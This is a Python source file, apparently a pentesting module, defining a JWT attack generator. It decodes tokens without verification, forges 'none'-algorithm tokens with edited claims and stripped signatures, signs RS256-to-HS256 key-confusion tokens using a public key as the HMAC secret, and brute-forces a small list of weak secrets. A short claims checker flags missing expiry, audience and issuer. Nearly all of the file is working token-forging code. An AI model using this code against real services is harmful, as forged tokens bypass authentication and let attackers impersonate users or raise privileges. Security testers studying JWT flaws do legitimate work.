"""
JWT Attack Generator

Analyzes JWT tokens and generates attack payloads:
- Decode and analyze JWT structure
- None algorithm attack
- Key confusion attacks
- Weak secret detection
- Expired token testing
"""

import base64
import json
import hmac
import hashlib
from typing import Dict, List, Optional, Tuple, Any

try:
    import jwt as pyjwt
    JWT_AVAILABLE = True
except ImportError:
    JWT_AVAILABLE = False
    print("[!] PyJWT not installed. JWT attack features will be limited.")


class JWTAttackGenerator:
    """Generate JWT attack payloads"""
    
    # Common weak secrets to test
    WEAK_SECRETS = [
        'secret',
        'password',
        'test',
        '123456',
        'admin',
        'root',
        'key',
        'token',
        '',
    ]
    
    def __init__(self):
        """Initialize JWT attack generator"""
        self.jwt_available = JWT_AVAILABLE
        
    def decode_jwt(self, token: str) -> Optional[Dict]:
        """
        Decode JWT without verification
        
        Args:
            token: JWT token string
            
        Returns:
            Dictionary with header and payload
        """
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None
                
            # Decode header
            header_data = self._base64_decode(parts[0])
            header = json.loads(header_data)
            
            # Decode payload
            payload_data = self._base64_decode(parts[1])
            payload = json.loads(payload_data)
            
            return {
                'header': header,
                'payload': payload,
                'signature': parts[2],
                'algorithm': header.get('alg', 'unknown'),
            }
            
        except Exception as e:
            print(f"[!] Error decoding JWT: {str(e)}")
            return None
    
    def generate_none_attack(self, token: str) -> Optional[str]:
        """
        Generate 'none' algorithm attack payload
        
        Args:
            token: Original JWT token
            
        Returns:
            Modified token with 'none' algorithm
        """
        decoded = self.decode_jwt(token)
        if not decoded:
            return None
            
        try:
            # Modify algorithm to 'none'
            decoded['header']['alg'] = 'none'
            
            # Encode header and payload
            header_encoded = self._base64_encode(
                json.dumps(decoded['header'])
            )
            payload_encoded = self._base64_encode(
                json.dumps(decoded['payload'])
            )
            
            # Create token without signature
            return f"{header_encoded}.{payload_encoded}."
            
        except Exception as e:
            print(f"[!] Error generating none attack: {str(e)}")
            return None
    
    def test_weak_secrets(self, token: str) -> List[Dict]:
        """
        Test JWT against common weak secrets
        
        Args:
            token: JWT token to test
            
        Returns:
            List of successful secrets
        """
        if not self.jwt_available:
            print("[!] PyJWT required for weak secret testing")
            return []
            
        results = []
        decoded = self.decode_jwt(token)
        
        if not decoded:
            return results
            
        algorithm = decoded['algorithm']
        
        for secret in self.WEAK_SECRETS:
            try:
                pyjwt.decode(token, secret, algorithms=[algorithm])
                results.append({
                    'secret': secret,
                    'algorithm': algorithm,
                    'severity': 'CRITICAL',
                    'description': f'JWT signed with weak secret: {secret}',
                })
            except pyjwt.InvalidSignatureError:
                continue
            except Exception:
                continue
                
        return results
    
    def generate_modified_payload(self, token: str, 
                                 modifications: Dict[str, Any]) -> Optional[str]:
        """
        Generate JWT with modified payload (unsigned)
        
        Args:
            token: Original JWT token
            modifications: Dictionary of fields to modify
            
        Returns:
            Modified token (unsigned)
        """
        decoded = self.decode_jwt(token)
        if not decoded:
            return None
            
        try:
            # Apply modifications
            for key, value in modifications.items():
                decoded['payload'][key] = value
                
            # Encode modified token without signature
            decoded['header']['alg'] = 'none'
            header_encoded = self._base64_encode(
                json.dumps(decoded['header'])
            )
            payload_encoded = self._base64_encode(
                json.dumps(decoded['payload'])
            )
            
            return f"{header_encoded}.{payload_encoded}."
            
        except Exception as e:
            print(f"[!] Error generating modified payload: {str(e)}")
            return None
    
    def generate_key_confusion(self, token: str, 
                              public_key: Optional[str] = None) -> Optional[str]:
        """
        Generate key confusion attack (RS256 -> HS256)
        
        Args:
            token: Original JWT token
            public_key: RSA public key to use as HMAC secret
            
        Returns:
            Modified token with algorithm confusion
        """
        decoded = self.decode_jwt(token)
        if not decoded or not public_key:
            return None
            
        try:
            # Change algorithm from RS256 to HS256
            decoded['header']['alg'] = 'HS256'
            
            # Create token signed with public key as HMAC secret
            header_encoded = self._base64_encode(
                json.dumps(decoded['header'])
            )
            payload_encoded = self._base64_encode(
                json.dumps(decoded['payload'])
            )
            
            # Sign with public key
            message = f"{header_encoded}.{payload_encoded}"
            signature = hmac.new(
                public_key.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()
            signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip('=')
            
            return f"{message}.{signature_encoded}"
            
        except Exception as e:
            print(f"[!] Error generating key confusion: {str(e)}")
            return None
    
    def analyze_claims(self, token: str) -> Dict:
        """
        Analyze JWT claims for security issues
        
        Args:
            token: JWT token to analyze
            
        Returns:
            Analysis results
        """
        decoded = self.decode_jwt(token)
        if not decoded:
            return {'error': 'Failed to decode token'}
            
        issues = []
        payload = decoded['payload']
        
        # Check for expiration
        if 'exp' not in payload:
            issues.append({
                'type': 'NO_EXPIRATION',
                'severity': 'MEDIUM',
                'description': 'Token has no expiration claim',
            })
            
        # Check for audience
        if 'aud' not in payload:
            issues.append({
                'type': 'NO_AUDIENCE',
                'severity': 'LOW',
                'description': 'Token has no audience claim',
            })
            
        # Check for issuer
        if 'iss' not in payload:
            issues.append({
                'type': 'NO_ISSUER',
                'severity': 'LOW',
                'description': 'Token has no issuer claim',
            })
            
        # Check algorithm
        if decoded['algorithm'].lower() == 'none':
            issues.append({
                'type': 'INSECURE_ALGORITHM',
                'severity': 'CRITICAL',
                'description': 'Token uses "none" algorithm',
            })
            
        return {
            'header': decoded['header'],
            'payload': payload,
            'issues': issues,
        }
    
    def _base64_decode(self, data: str) -> str:
        """Base64 decode with padding"""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        return base64.urlsafe_b64decode(data).decode('utf-8')
    
    def _base64_encode(self, data: str) -> str:
        """Base64 encode without padding"""
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')


def analyze_jwt(token: str) -> Dict:
    """
    Convenience function to analyze a JWT token
    
    Args:
        token: JWT token to analyze
        
    Returns:
        Analysis results and attack payloads
    """
    generator = JWTAttackGenerator()
    
    results = {
        'analysis': generator.analyze_claims(token),
        'attacks': {}
    }
    
    # Generate none attack
    none_attack = generator.generate_none_attack(token)
    if none_attack:
        results['attacks']['none_algorithm'] = none_attack
        
    # Test weak secrets
    weak_secrets = generator.test_weak_secrets(token)
    if weak_secrets:
        results['attacks']['weak_secrets'] = weak_secrets
        
    return results
